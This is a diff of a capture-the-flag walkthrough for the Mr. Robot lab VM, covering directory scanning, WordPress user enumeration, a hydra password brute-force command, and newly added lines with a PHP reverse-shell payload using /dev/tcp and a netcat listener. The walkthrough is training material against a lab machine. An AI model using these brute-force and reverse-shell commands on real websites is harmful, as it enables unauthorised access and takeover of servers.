@@ -20,10 +20,11 @@ Used command ```sudo dirb http://192.168.1.8``` to find the hidden files and dir
 ## Web Enumeration
 After the dirb scan I found a file named ```http://192.168.1.8/robots.txt``` and then I manually inspected the file.
 ### Key findings 
-"fsocity.dic" A massive custom dictionary file (wordlist).
-"key-1-of-3.txt" The first flag
+"fsocity.dic" A massive wordlist.
+"key-1-of-3.txt" The first flag. 
+
 ### Wordpress login page discovery
-dirb scan also flagged a wp login page "http://192.168.1.8/wp-login". That got me into a target login page and also wordlist fsocity.dic to use against it. 
+dirb scan also flagged a wp login page ```http://192.168.1.8/wp-login```. That got me into a target login page and also wordlist fsocity.dic to use against it. 
 
 ## User Enumeration: Cracking the login id
 Used burpsuit intruder tool to determine the user name from the wordlist 'fsocity.dic'
@@ -37,3 +38,12 @@ In order to get the password for the user "Elliot" I used hydra to bruteforce at
 To make the attack faster and more efficient I used command ```sort /home/kali/mrrobot/fsocity.dic | uniq > ufsocity.txt``` 
 ### The Attack (hydra)
 Used command ``` sudo hydra -vv -l Elliot -P  ufsocity.txt 192.168.1.8 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is Incorrect' ``` to crack the password successfully.
+
+## Reverse Shell
+After successfully logged into the website then I navigated to Appearance > Editor and selected the 404 Template since its easy to trigger. 
+### Payload used 
+    ```<?php
+      exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/443 0>&1'");
+    ?>```
+### Netcat listener
+ ```nc -lvp 443 ```
